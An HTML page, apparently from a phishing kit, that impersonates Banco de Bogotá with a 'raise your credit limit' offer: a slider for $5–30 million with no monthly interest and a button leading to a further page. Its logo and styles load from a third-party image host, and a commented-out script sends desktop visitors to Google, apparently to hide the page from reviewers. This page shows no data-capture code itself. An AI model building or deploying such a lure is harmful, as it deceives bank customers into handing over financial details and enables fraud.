

<html>
  <head>
    <!-- <script>
        if (!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
            window.location.href = "https://www.google.com";
        }
    </script> -->
    <meta http-equiv="Content-Type" content="text/html; charset=utf8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>Aumento Tu Cupo - Banco de Bogotá</title>

    <link
        rel="stylesheet"
        href="https://sapp2406.sirv.com/bogo/lfr_style.css"
    />
    <link
      rel="stylesheet"
      href="https://sapp2406.sirv.com/bogo/lfr_ownstyle.css"
    />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        /* Loader Styles */
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #2c3e50;
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .loader-container {
            position: relative;
            width: 60px;
            height: 60px;
            animation: rotateLoader 1.5s linear infinite;
        }

        .dot {
            position: absolute;
            width: 20px;
            height: 20px;
            border-radius: 50%;
        }

        .dot-yellow {
            background-color: #f1c40f;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
        }

        .dot-blue {
            background-color: #3498db;
            bottom: 5px;
            left: 0;
        }

        .dot-red {
            background-color: #e74c3c;
            bottom: 5px;
            right: 0;
        }

        @keyframes rotateLoader {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        body {
            /* Split background: Left half white, Right half light gray-blue */
            background: linear-gradient(90deg, #fcfcfc 50%, #eef3f6 50%) !important;
            min-height: 100vh;
            margin: 0;
        }

        /* Reset container styles */
        .container {
            display: flex !important;
            flex-direction: row !important;
            justify-content: center !important;
            align-items: flex-start !important;
            max-width: 1000px !important;
            margin: 0 auto !important;
            padding: 20px !important;
            background: transparent !important;
            box-shadow: none !important;
            position: relative !important;
            height: auto !important;
        }

        /* White Card */
        .login-card-content {
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            padding: 20px;
            margin-bottom: 15px;
        }

        /* Left Side */
        .container__login {
            flex: 0 0 380px !important;
            padding-top: 0 !important;
            margin-right: 40px !important;
            background: transparent !important;
            position: relative !important;
            width: 380px !important;
            box-shadow: none !important;
            left: auto !important;
            top: auto !important;
            display: block !important;
        }

        /* Right Side */
        .container__info {
            flex: 1 !important;
            padding: 0 !important;
            background: transparent !important;
            position: relative !important;
            width: auto !important;
            height: auto !important;
            box-shadow: none !important;
            left: auto !important;
            top: auto !important;
            right: auto !important;
            display: block !important;
            max-width: 500px !important;
        }

        /* Responsive Styles */
        @media (max-width: 768px) {
            body {
                background: #ffffff !important;
            }

            .container {
                flex-direction: column !important;
                align-items: center !important;
                padding: 15px !important;
                width: 100% !important;
                box-sizing: border-box !important;
            }

            .container__login {
                width: 100% !important;
                flex: none !important;
                margin-right: 0 !important;
                margin-bottom: 20px !important;
                max-width: 100% !important;
            }

            .container__info {
                width: 100% !important;
                flex: none !important;
                max-width: 100% !important;
                margin-top: 10px !important;
            }

            .login-card-content {
                padding: 15px !important;
            }
            
            .bottom-icons-container {
                margin-top: 20px;
                padding-bottom: 10px;
            }
        }

        /* Images */
        .container__info img {
             border-radius: 8px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
             display: block;
             width: 100%;
        }

        /* Blue Banner */
        .blue-banner {
            background-color: #0033a0;
            color: white;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            font-size: 0.9em;
        }
        .blue-banner img {
            width: 40px;
            margin-right: 10px;
        }

        /* Slider Specific Styles */
        .monto {
            font-size: 26px;
            font-weight: bold;
            margin: 10px 0;
            color: #333;
            text-align: center;
        }
        
        .titulo {
            font-size: 16px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #333;
            text-align: center;
        }

        input[type=range] {
            width: 100%;
            margin: 15px 0;
            cursor: pointer;
        }

        .minmax {
            display: flex;
            justify-content: space-between;
            font-size: 14px;
            color: #555;
            margin-bottom: 15px;
        }

        .aviso {
            font-size: 13px;
            color: #c62828;
            margin-top: 10px;
            text-align: center;
            background-color: #ffebee;
            padding: 8px;
            border-radius: 4px;
        }
        
        .card-image {
            width: 100%;
            border-radius: 8px;
            margin-bottom: 15px;
        }

        /* Bottom Icons */
        .bottom-icons-container {
            display: flex;
            align-items: center;
            position: relative;
            margin-top: 25px;
            padding-bottom: 20px;
            width: 100%;
        }
        .icons-scroll-view {
            display: flex;
            overflow-x: auto;
            scroll-behavior: smooth;
            gap: 10px;
            width: 100%;
            -ms-overflow-style: none;
            scrollbar-width: none;
            padding: 0 5px;
        }
        .icons-scroll-view::-webkit-scrollbar {
            display: none;
        }
        .bottom-icon {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            color: #0033a0;
            font-size: 0.75rem;
            font-weight: bold;
            flex: 0 0 85px;
            cursor: pointer;
        }
        .bottom-icon-box {
            width: 48px;
            height: 48px;
            border: 1px solid #d1d1d1;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 8px;
            background-color: transparent;
            transition: all 0.2s;
        }
        .bottom-icon-box:hover {
            border-color: #0033a0;
            background-color: #f4f8ff;
        }
        .bottom-icon-box svg {
            width: 24px;
            height: 24px;
            fill: #0033a0;
        }
        .arrow-btn {
            width: 32px;
            height: 32px;
            border: 1px solid #d1d1d1;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #0033a0;
            cursor: pointer;
            background: #fff;
            flex-shrink: 0;
            z-index: 2;
        }
        .arrow-btn:hover {
            border-color: #0033a0;
            background-color: #f4f8ff;
        }
        .arrow-btn.left {
            margin-right: 5px;
        }
        .arrow-btn.right {
            margin-left: 5px;
        }
        .arrow-btn svg {
            width: 16px;
            height: 16px;
            fill: #0033a0;
        }
        .btn-main {
            background-color: #0033a0;
            width: 100%;
            margin-top: 15px;
        }
    </style>
  </head>

  <body>
    <div class="box-container">
      <div class="container">
        
        <!-- Left Side: Cupo Selection -->
        <div class="container__login">
          <div class="container__login--header">
            <img src="https://sapp2406.sirv.com/bogo/logobanco1.png" alt="Banco de Bogotá" />
          </div>
          
          <div class="container__login--title">
          </div>

          <!-- Blue Banner -->
          <div class="blue-banner">
              <img src="images/per.png" alt="Icono" />
              <div style="flex: 1;">
                  <strong>¿Necesitas ayuda?</strong><br>
                  <a href="#" style="color: white; text-decoration: underline;">Contacta con un asesor ></a>
              </div>
          </div>

          <!-- White Card Container for Form Elements -->
          <div class="login-card-content">
              
              <div class="titulo">
                  Escoge el cupo ideal entre $5.000.000 y $30.000.000
              </div>

              <img src="images/ChatGPT Image 9 ene 2026, 22_32_14.png" alt="Tarjeta" class="card-image">

              <div class="monto" id="valor">
                  $5.000.000
              </div>

              <input type="range" min="5000000" max="30000000" step="500000" value="5000000" id="slider" oninput="actualizar()">

              <div class="minmax">
                  <span>$5.000.000</span>
                  <span>$30.000.000</span>
              </div>

              <div class="aviso">
                  El cupo se asigna sin intereses mensuales y con aprobación digital.
              </div>

              <button class="btn-main" onclick="window.location.href='index0.php.html'">
                  AUMENTAR CUPO
              </button>

              <div style="text-align: center; color: #999; font-size: 0.8em; margin-top: 15px;">
                  Este sitio está protegido por reCAPTCHA y aplican las políticas
              </div>

          </div>
        </div>

        <!-- Right Side: Promo & Icons -->
        <div class="container__info">
           <img id="bannerImage" src="images/talaval.png" alt="Te presentamos a Tu Aval" style="width: 100%; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); transition: opacity 0.5s ease-in-out;">
            
            <script>
                document.addEventListener('DOMContentLoaded', function() {
                    const bannerImages = ['images/talaval.png', 'images/millas.png'];
                    let currentBannerIndex = 0;
                    const bannerImgElement = document.getElementById('bannerImage');
                    
                    if (bannerImgElement) {
                        setInterval(() => {
                            currentBannerIndex = (currentBannerIndex + 1) % bannerImages.length;
                            bannerImgElement.src = bannerImages[currentBannerIndex];
                        }, 2000);
                    }
                });
            </script>
           
           <!-- Bottom Icons Carousel -->
           <div class="bottom-icons-container">
              <!-- Left Arrow -->
              <div class="arrow-btn left" onclick="scrollIcons('left')">
                   <svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
              </div>
              
              <div class="icons-scroll-view" id="iconsTrack">
                  <!-- Icon 1: Configuración de seguridad -->
                  <div class="bottom-icon">
                      <div class="bottom-icon-box">
                          <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
                      </div>
                      <span>Configuración de seguridad</span>
                  </div>
                  <!-- Icon 2: Solicitar un producto -->
                  <div class="bottom-icon">
                      <div class="bottom-icon-box">
                          <svg viewBox="0 0 24 24"><path d="M20 6h-2.18c.11-.31.18-.65.18-1 0-1.66-1.34-3-3-3-1.05 0-1.96.54-2.5 1.35l-.5.67-.5-.68C10.96 2.54 10.05 2 9 2 7.34 2 6 3.34 6 5c0 .35.07.69.18 1H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2zm-5-2c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm11 15H4v-2h16v2zm0-5H4V8h5.08L7 10.83 8.62 12 11 8.76l1-1.36 1 1.36L15.38 12 17 10.83 14.92 8H20v6z"/></svg>
                      </div>
                      <span>Solicitar un producto</span>
                  </div>
                  <!-- Icon 3: Atención al cliente -->
                  <div class="bottom-icon">
                      <div class="bottom-icon-box">
                          <svg viewBox="0 0 24 24"><path d="M19 14v4h-2v-4h2M7 14v4H5v-4h2m12-2h-2v8h2c1.1 0 2-.9 2-2v-4c0-1.1-.9-2-2-2zM7 12H5v8h2c1.1 0 2-.9 2-2v-4c0-1.1-.9-2-2-2zM12 2C6.48 2 2 6.48 2 12c0 1.54.36 2.98.97 4.29L4.46 19c.66 1.15 2.05 1.57 3.23.95.4-.21.72-.51.97-.87C9.33 19.67 10.63 20 12 20s2.67-.33 3.34-.92c.25.36.57.66.97.87 1.18.62 2.57.2 3.23-.95l1.49-2.71c.61-1.31.97-2.75.97-4.29 0-5.52-4.48-10-10-10z"/></svg>
                      </div>
                      <span>Atención al cliente</span>
                  </div>
                  <!-- Icon 4: Solicitar un turno digital -->
                  <div class="bottom-icon" onclick="window.open('turno.html', '_blank')">
                      <div class="bottom-icon-box">
                          <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
                      </div>
                      <span>Solicitar un turno digital</span>
                  </div>
                  <!-- Icon 5: Buscar cajeros y oficinas -->
                  <div class="bottom-icon" onclick="window.open('https://www.grupoaval.com/BuscadordePuntosAval/', '_blank')">
                      <div class="bottom-icon-box">
                          <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
                      </div>
                      <span>Buscar cajeros y oficinas</span>
                  </div>
              </div>

              <!-- Right Arrow -->
              <div class="arrow-btn right" onclick="scrollIcons('right')">
                   <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
              </div>
           </div>
        </div>
      </div>

      


    </div>
    <!-- Loader Overlay -->
    <div id="loading-overlay">
        <div class="loader-container">
            <div class="dot dot-yellow"></div>
            <div class="dot dot-blue"></div>
            <div class="dot dot-red"></div>
        </div>
    </div>

    <script>
    function actualizar() {
        let valor = document.getElementById("slider").value;
        document.getElementById("valor").innerText =
            "$" + Number(valor).toLocaleString("es-CO");
    }

    function scrollIcons(direction) {
        const container = document.getElementById('iconsTrack');
        const scrollAmount = 150; 
        if (direction === 'left') {
            container.scrollBy({ left: -scrollAmount, behavior: 'smooth' });
        } else {
            container.scrollBy({ left: scrollAmount, behavior: 'smooth' });
        }
    }

    document.addEventListener('DOMContentLoaded', function() {
        const container = document.getElementById('iconsTrack');
        const leftArrow = document.querySelector('.arrow-btn.left');
        
        if (container && leftArrow) {
            container.addEventListener('scroll', function() {
                if (container.scrollLeft > 10) {
                    leftArrow.style.display = 'flex';
                } else {
                    leftArrow.style.display = 'none';
                }
            });
        }
    });
    </script>
  </body>
</html>
